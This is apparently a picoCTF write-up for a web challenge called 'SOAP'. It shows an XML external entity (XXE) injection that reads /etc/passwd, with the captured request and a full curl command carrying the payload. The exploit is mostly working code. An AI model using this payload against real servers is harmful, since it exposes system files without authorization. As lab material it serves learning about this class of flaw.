## SOAP

difficulty: medium

---

## sol

the challenge hits to xml external entity being the technique to solve the challenge
i found an [article](https://portswigger.net/web-security/xxe) explaining how to use xml injection to read files on a server

when clicking the icons on the site a xml post request is sent which looks like this:

~~~
POST /data HTTP/1.1
Host: saturn.picoctf.net:49853
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 61
Origin: http://saturn.picoctf.net:49853
Connection: keep-alive
~~~

with the payload:
~~~
<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
~~~

we can see this is an xml request from the content type being application/xml
the payload defined what we want from the server

by adding an external entity xxe which is the content of the passwd file using:

~~~
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
~~~

and then changing the id number for &xxe; we will be sent the contents of the file.

all we have to do is copy the post request and add xml code:

~~~
curl 'http://saturn.picoctf.net:49853/data' \
    -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0' \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Content-Type: application/xml' \
    -H 'Origin: http://saturn.picoctf.net:49853' \
    -H 'Connection: keep-alive' \
    --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
~~~

